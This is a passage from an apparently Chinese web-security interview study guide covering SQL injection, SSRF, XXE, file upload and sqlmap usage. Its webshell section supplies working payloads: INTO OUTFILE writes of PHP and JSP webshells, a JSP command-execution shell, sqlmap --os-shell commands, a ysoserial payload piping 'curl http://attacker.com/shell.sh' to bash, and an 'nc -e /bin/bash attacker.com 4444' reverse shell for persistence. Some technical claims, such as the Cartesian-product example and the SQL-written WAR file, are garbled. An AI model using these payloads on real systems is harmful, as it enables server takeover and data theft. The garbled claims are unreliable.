将字符串编译成代码对象，可以和<code>exec()</code>或<code>eval()</code>一起使用。</li></ul><p>文件读取</p><ul><li><code>open()</code>: 打开文件并返回文件对象。</li><li><code>read()</code>, <code>readline()</code>, <code>readlines()</code>: 从文件对象中读取内容。</li><li><code>pathlib.Path.read_text()</code>: 读取文本文件的内容。</li></ul><p>命令执行</p><ul><li><code>os.system()</code>: 执行命令并等待命令执行完毕。</li><li><code>subprocess.run()</code>, <code>subprocess.Popen()</code>: 执行命令并提供更多控制，如捕获输出。</li></ul><h2 id="盲注是什么，怎么盲注"><a href="#盲注是什么，怎么盲注" class="headerlink" title="盲注是什么，怎么盲注"></a>盲注是什么，怎么盲注</h2><p>盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注入和利用的方式。</p><p>盲注的手段有两种：<br>一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入；<br>一个是通过 sql 语句处理时间的不同来判断是否存在注入(time-based)，可以用 benchmark，sleep 等造成延时效果的函数，也可以通过构造大笛卡尔积的联合查询表来达到延时的目的。</p><ol><li><p><strong>Boolean-based盲注</strong>：</p><ul><li>假设我们有一个基于用户输入的查询，例如：<code>SELECT * FROM users WHERE username = &#39;&quot; . $username . &quot;&#39; AND password = &#39;&quot; . $password . &quot;&#39;&quot;</code></li><li>攻击者可能会尝试发送一个用户名，其中包含SQL逻辑，例如：<code>&#39; OR &#39;1&#39;=&#39;1</code></li><li>如果这个查询导致返回所有用户，那么攻击者就可以推断出注入是可能的。</li></ul></li><li><p><strong>Time-based盲注</strong>：</p><ul><li>使用<code>SLEEP()</code>函数来延迟响应时间，例如：<code>&#39; OR SLEEP(5)=0</code></li><li>如果响应时间明显变长，那么攻击者就可以推断出注入是可能的。</li></ul></li></ol><p>笛卡尔积是指两个集合的所有可能的有序对的集合。在数据库查询中，如果两个表进行笛卡尔积查询，那么会返回两个表行数相乘的结果集。</p><p><strong>大笛卡尔积</strong>是指构造一个查询，使得查询结果集非常大，从而显著增加查询的执行时间。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">JOIN</span> addresses <span class="keyword">ON</span> users.id <span class="operator">=</span> addresses.user_id</span><br><span class="line"><span class="keyword">JOIN</span> orders <span class="keyword">ON</span> users.id <span class="operator">=</span> orders.user_id</span><br><span class="line"><span class="keyword">WHERE</span> users.username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>如果<code>users</code>表有1000行，<code>addresses</code>表有500行，<code>orders</code>表有200行，那么这个查询可能会返回100,000,000（1000 * 500 * 200）行结果，这将显著增加查询的执行时间，从而可以用来进行时间盲注攻击。</p><h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title="宽字节注入产生原理以及根本原因"></a>宽字节注入产生原理以及根本原因</h2><p>1）产生原理：在数据库使用了宽字符集而 WEB 中没考虑这个问题的情况下，由于 0xBF27 是两个字符，在 PHP 中 addslash 和 magic_quotes_gpc 开启时，会对 0x27 单引号进行转义，因此 0xbf27 会变成 0xbf5c27。<br>而数据进入数据库中时，由于 0XBF5C 是一个另外的字符，因此转义符号会被前面的 bf 带着“吃掉”，单引号由此逃逸出来可以用来闭合合语句。<br>2）根本原因：<br>character_set_client（客户端的字符集）和 character_set_connection（连接层的字符集）不同，或转换函数如，iconv、mb_convert_encoding 使用不当。<br>3）解决办法：统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为 UTF-8。或对数据进行正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使用。</p><h2 id="mysql-的网站注入-5-0-以上和-5-0-以下有什么区别"><a href="#mysql-的网站注入-5-0-以上和-5-0-以下有什么区别" class="headerlink" title="mysql 的网站注入 5.0 以上和 5.0 以下有什么区别"></a>mysql 的网站注入 5.0 以上和 5.0 以下有什么区别</h2><p>5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名；<br>5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p><h2 id="SSRF-漏洞的验证方法"><a href="#SSRF-漏洞的验证方法" class="headerlink" title="SSRF 漏洞的验证方法"></a>SSRF 漏洞的验证方法</h2><p>因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以就可以通过抓包分析发送的请求是否是由服务器所发送的，从而来判断是否存在 SSRF 漏洞；<br>在页面源码中查找访问的资源地址，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=（地址）的就可能存在</a> SSRF 漏洞。</p><h2 id="SSRF-漏洞的成因、防御、绕过"><a href="#SSRF-漏洞的成因、防御、绕过" class="headerlink" title="SSRF 漏洞的成因、防御、绕过"></a>SSRF 漏洞的成因、防御、绕过</h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。<br>利用：构造恶意内网 IP 做探测，或者使用其余所支持的协议对其余服务进行攻击。防御：禁止跳转，限制协议，内外网限制，URL 限制。<br>绕过：使用不同协议，针对 IP，IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转+dns rebinding。</p><h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title="导致文件包含的函数"></a>导致文件包含的函数</h2><p>PHP：include(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servlet：java.io.File(), java.io.FileReader()<br>ASP：include file, include virtual</p><h4 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h4><p>在PHP中，文件包含函数允许你将一个文件作为另一个文件的一部分包含进来。这些函数可以包含文本文件、PHP脚本或其他任何类型的文件。如果被包含的文件中包含PHP代码，那么这段代码也会被执行。</p><ul><li><code>include()</code>: 如果文件找不到，会发出一个警告，但脚本会继续执行。</li><li><code>include_once()</code>: 类似于<code>include()</code>，但即使文件被多次包含，也只会包含一次。</li><li><code>require()</code>: 如果文件找不到，会发出一个致命错误，脚本会停止执行。</li><li><code>require_once()</code>: 类似于<code>require()</code>，但即使文件被多次包含，也只会包含一次。</li><li><code>fopen()</code>: 打开文件或者URL，返回一个文件指针。</li><li><code>readfile()</code>: 读取文件并输出到浏览器。</li></ul><h4 id="JSP-Servlet"><a href="#JSP-Servlet" class="headerlink" title="JSP&#x2F;Servlet"></a>JSP&#x2F;Servlet</h4><p>在Java的JSP和Servlet中，可以使用<code>java.io.File</code>和<code>java.io.FileReader</code>类来读取文件内容。</p><ul><li><code>java.io.File()</code>: 创建一个File对象，表示一个文件或目录。</li><li><code>java.io.FileReader()</code>: 创建一个FileReader对象，用于读取字符文件。</li></ul><h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><p>在ASP（Active Server Pages）中，可以使用以下函数来包含文件：</p><ul><li><code>include file</code>: 包含一个文件，可以是ASP文件或其他文本文件。</li><li><code>include virtual</code>: 类似于<code>include file</code>，但可以包含虚拟路径中的文件。</li></ul><h2 id="文件上传漏洞绕过方法"><a href="#文件上传漏洞绕过方法" class="headerlink" title="文件上传漏洞绕过方法"></a>文件上传漏洞绕过方法</h2><p>前端 Js 绕过、黑白名单绕过、文件类型绕过（mime、文件头、文件内容）、路径截断绕过（00 截断）、中间件解析漏洞、条件竞争、二次渲染、编辑器漏洞</p><h2 id="文件上传防御方法"><a href="#文件上传防御方法" class="headerlink" title="文件上传防御方法"></a>文件上传防御方法</h2><p>上传目录的用户执行权限全部取消、判断文件类型、使用随机数改写文件名和文件路径、网站服务器和文件服务器分离、白名单检查、限制文件大小</p><h2 id="Sqlmap常用参数"><a href="#Sqlmap常用参数" class="headerlink" title="Sqlmap常用参数"></a>Sqlmap常用参数</h2><p>-u（指定url）、-r（读取需要注入的post请求的文本）、-m（批量跑get注入）、-p（指定注入参数）、–current-db（获取当前数据库）、–table（枚举数据库表）、–tamper（使用过waf脚本）</p><h2 id="XXE-漏洞原理与防御"><a href="#XXE-漏洞原理与防御" class="headerlink" title="XXE 漏洞原理与防御"></a>XXE 漏洞原理与防御</h2><p>原理：XXE（XML 外部实体注入，XML External Entity），在应用程序解析 XML 输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起 DoS 拒绝服务攻击、执行系统命令等。<br>Java 中的 XXE 支持 sun.net.<a href="http://www.protocol/">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用 file 协议读取文件，利用 http 协议探测内网。<br>防御：配置 XML 处理器使用禁用 DTD、禁止外部实体解析、通过黑名单过滤用户提交的 XML 数据。<br>XXE（XML External Entity）漏洞是一种常见的安全漏洞，它允许攻击者通过恶意构造的XML数据来访问或破坏系统资源。以下是一些具体的XXE漏洞示例和防御措施：</p><h4 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1. 文件读取"></a>1. 文件读取</h4><p>攻击者可以通过XXE漏洞读取服务器上的敏感文件。例如，攻击者可以提交以下XML数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段XML定义了一个外部实体<code>file</code>，它引用了服务器上的<code>/etc/passwd</code>文件。当应用程序解析这个XML时，会读取该文件的内容并将其包含在响应中。</p><h4 id="2-内网探测"><a href="#2-内网探测" class="headerlink" title="2. 内网探测"></a>2. 内网探测</h4><p>攻击者可以利用XXE漏洞探测内网中的其他系统。例如，攻击者可以提交以下XML数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">scan</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal.example.com&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;scan;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段XML定义了一个外部实体<code>scan</code>，它引用了内网中的一个URL。当应用程序解析这个XML时，会尝试访问该URL，从而暴露了内网的存在。</p><h4 id="3-拒绝服务攻击（DoS）"><a href="#3-拒绝服务攻击（DoS）" class="headerlink" title="3. 拒绝服务攻击（DoS）"></a>3. 拒绝服务攻击（DoS）</h4><p>攻击者可以通过XXE漏洞发起拒绝服务攻击。例如，攻击者可以提交以下XML数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/zero&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;a;</span><span class="symbol">&amp;b;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段XML定义了多个外部实体，每个实体都引用了一个无限大的文件（如<code>/dev/zero</code>）。当应用程序解析这个XML时，会尝试读取这些文件，导致资源耗尽，从而引发拒绝服务攻击。</p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><h4 id="1-禁用DTD"><a href="#1-禁用DTD" class="headerlink" title="1. 禁用DTD"></a>1. 禁用DTD</h4><p>在XML解析器中禁用DTD（Document Type Definition）可以防止外部实体的解析。例如，在Java中，可以使用以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><p>这段代码禁用了DTD，从而防止了XXE攻击。</p><h4 id="2-禁止外部实体解析"><a href="#2-禁止外部实体解析" class="headerlink" title="2. 禁止外部实体解析"></a>2. 禁止外部实体解析</h4><p>在XML解析器中禁止外部实体解析。例如，在Java中，可以使用以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure><p>这段代码禁止了外部实体的解析，从而防止了XXE攻击。</p><h4 id="3-通过黑名单过滤用户提交的XML数据"><a href="#3-通过黑名单过滤用户提交的XML数据" class="headerlink" title="3. 通过黑名单过滤用户提交的XML数据"></a>3. 通过黑名单过滤用户提交的XML数据</h4><p>在应用程序中，可以使用黑名单来过滤用户提交的XML数据，防止恶意构造的XML数据被解析。例如，可以使用正则表达式来检测XML数据中是否包含外部实体的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xmlData</span> <span class="operator">=</span> ...; <span class="comment">// 用户提交的XML数据</span></span><br><span class="line"><span class="keyword">if</span> (xmlData.contains(<span class="string">&quot;&lt;!ENTITY&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;XXE attack detected&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="任意文件下载漏洞的修复方案"><a href="#任意文件下载漏洞的修复方案" class="headerlink" title="任意文件下载漏洞的修复方案"></a>任意文件下载漏洞的修复方案</h2><p>1）过滤用户数据，如“&#x2F;”，“*”，”.”等特殊字符<br>2）更新中间件<br>3）要下载的文件地址保存至数据库中<br>4）文件路径保存至数据库，让用户提交文件对应 ID 或 session 下载文件<br>5）用户下载文件之前需要进行权限判断<br>6）文件放在 web 无法直接访问的目录下<br>7）不允许提供目录遍历服务<br>8）公开文件可放置在 web 应用程序下载目录中通过链接进行下载</p><h2 id="CSRF-攻击和-XSS-攻击有什么区别"><a href="#CSRF-攻击和-XSS-攻击有什么区别" class="headerlink" title="CSRF 攻击和 XSS 攻击有什么区别"></a>CSRF 攻击和 XSS 攻击有什么区别</h2><p>CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。<br>CSRF 攻击成本也比 XSS 低，用户每天都要访问大量网页，无法确认每一个网页的合法性，从用户角度来说，无法彻底防止 CSRF 攻击。</p><h2 id="发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选"><a href="#发现-demo-jsp-uid-110-注入点，你有哪几种思路获取-webshell，哪种是优选" class="headerlink" title="发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选"></a>发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选</h2><p>有写入权限的，构造联合查询语句使用 using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高。<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell。</p><p><strong>适用前提：</strong></p><ul><li>目标数据库是 MySQL，并且当前数据库用户有 <code>FILE</code> 权限。</li><li>Web 目录（如 <code>htdocs</code>、<code>www</code>）对数据库用户是可写的。</li></ul><p><strong>利用方式：</strong><br>如果数据库用户拥有 <code>FILE</code> 权限，可以使用 <code>INTO OUTFILE</code> 直接写入 WebShell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p>或者在 Windows 下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:\\xampp\\htdocs\\shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p>这样 <code>shell.php</code> 便可通过 <code>POST</code> 方式执行任意命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;cmd=system(&#x27;whoami&#x27;);&quot;</span> http://target.com/shell.php</span><br></pre></td></tr></table></figure><p><strong>局限性：</strong></p><ul><li><code>secure_file_priv</code> 可能会限制 <code>OUTFILE</code> 的使用。</li><li>Web 服务器可能禁止 <code>.php</code> 解析（如使用 <code>htaccess</code> 限制）。</li><li>需要确认 Web 目录的路径，若不清楚可以尝试写入 <code>/tmp/</code> 再尝试文件包含。</li></ul><p><strong>优化方案：</strong><br>可以结合 <strong>SQLMap</strong> 自动执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --file-write=<span class="string">&quot;shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure><p>然后访问 <code>http://target.com/shell.php</code>，即可执行任意 PHP 代码。</p><p><strong>2. 使用 <code>LOAD_FILE()</code> 读取 WebShell</strong><br>如果 <code>INTO OUTFILE</code> 受限，但 <code>LOAD_FILE()</code> 可用，可以读取已有 WebShell 或配合 <strong>文件包含漏洞（LFI）</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/var/www/html/config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>如果 Web 服务器存在 <strong>文件包含漏洞</strong>，可以结合 SQL 注入利用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后通过 <strong>LFI</strong> 访问 <code>/tmp/shell.php</code>。</p><p><strong>3. SQLMap 自动获取 Shell</strong><br><code>sqlmap</code> 自带 <code>--os-shell</code> 选项，可以自动执行系统命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://target.com/demo.jsp?uid=110&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>如果数据库用户具备 <strong>写文件权限</strong>，SQLMap 会自动创建 WebShell，并提供交互式命令行。</p><h3 id="1-MySQL-JSP：写入-WebShell"><a href="#1-MySQL-JSP：写入-WebShell" class="headerlink" title="(1) MySQL+JSP：写入 WebShell"></a><strong>(1) MySQL+JSP：写入 WebShell</strong></h3><p>如果 Web 服务器运行的是 JSP，并且 <code>INTO OUTFILE</code> 可用，可以写入 <code>.jsp</code> WebShell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;% Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)); %&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.jsp&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后通过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://target.com/shell.jsp?cmd=id&quot;</span></span><br></pre></td></tr></table></figure><p>执行命令。</p><h3 id="2-MySQL-Tomcat：写入-WAR-WebShell"><a href="#2-MySQL-Tomcat：写入-WAR-WebShell" class="headerlink" title="(2) MySQL+Tomcat：写入 WAR WebShell"></a><strong>(2) MySQL+Tomcat：写入 WAR WebShell</strong></h3><p>如果 <code>INTO OUTFILE</code> 受限，但数据库用户有 <strong>写入 Web 目录权限</strong>，可以直接上传 <code>.war</code> 文件：</p><ol><li>生成 <strong>JSP WebShell</strong>：<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;% </span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>); </span><br><span class="line">    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li>压缩为 <code>.war</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure></li><li>使用 SQL 注入上传：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;context&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;/context&gt;&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/usr/local/tomcat/webapps/shell.war&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>访问 <code>http://target.com/shell/cmd.jsp?cmd=id</code>，成功执行命令。</li></ol><h3 id="5-通过-Java-反序列化漏洞-Getshell"><a href="#5-通过-Java-反序列化漏洞-Getshell" class="headerlink" title="5. 通过 Java 反序列化漏洞 Getshell"></a><strong>5. 通过 Java 反序列化漏洞 Getshell</strong></h3><p>如果目标应用使用了 <strong>Apache Commons Collections</strong>、<code>fastjson</code> 等，可能存在 Java 反序列化漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com/shell.sh | bash&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure><p>然后通过 SQL 注入写入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, LOAD_FILE(<span class="string">&#x27;/tmp/payload.ser&#x27;</span>));</span><br></pre></td></tr></table></figure><p>如果应用程序读取 <code>users</code> 表数据，可能触发反序列化漏洞，执行恶意命令。</p><h3 id="6-Java-WebShell-持久化方式"><a href="#6-Java-WebShell-持久化方式" class="headerlink" title="6. Java WebShell 持久化方式"></a><strong>6. Java WebShell 持久化方式</strong></h3><p>如果成功 Getshell，可以持久化访问：</p><ol><li>**修改 Tomcat <code>web.xml</code>**：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>shell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/shell.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>利用 ScheduledTask 创建反向 Shell</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;nc -e /bin/bash attacker.com 4444&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><strong>植入 Java Agent</strong>（适用于 Spring Boot）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:shell.jar -jar target.jar</span><br></pre></td></tr></table></figure></li></ol><h2 id="说出至少三种业务逻辑漏洞，以及修复方式"><a href="#说出至少三种业务逻辑漏洞，以及修复方式" class="headerlink" title="说出至少三种业务逻辑漏洞，以及修复方式"></a>说出至少三种业务逻辑漏洞，以及修复方式</h2><p>密码找回漏洞中存在：密码允许暴力破解 存在通用型找回凭证 可以跳过验证步骤 找回凭证可以拦包获取 等方式来通过厂商提供的密码找回功能来得到密码。<br>身份认证漏洞中最常见的是： 会话固定攻击 Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造用户身份。<br>验证码漏洞中存在： 验证码允许暴力破解 验证码可以通过 Javascript 或者改包的方法来进行绕过</p><h2 id="sqlmap-怎么对一个注入点注入"><a href="#sqlmap-怎么对一个注入点注入" class="headerlink" title="sqlmap 怎么对一个注入点注入**"></a>sqlmap 怎么对一个注入点注入**</h2><ol><li>如果是 GET 型注入点，直接使用命令：<code>sqlmap -u &quot;注入点网址&quot;</code></li><li>如果是 POST 型注入点，可以使用命令：<code>sqlmap -u &quot;注入点网址&quot; --data=&quot;post 的参数&quot;</code></li><li>如果是 cookie、X-Forwarded-For 等，可以在访问的时候，用 Burp Suite 抓包，将注入点用引号替换，放到文件里，然后使用命令：<code>sqlmap -r &quot;文件地址&quot;</code></li></ol><h2 id="延时注入如何来判断"><a href="#延时注入如何来判断" class="headerlink" title="延时注入如何来判断"></a>延时注入如何来判断</h2><p>if(ascii(substring(“hello”, 1, 1))&#x3D;104, sleep(5), 1)</p><h2 id="OWASP-漏洞都有哪些"><a 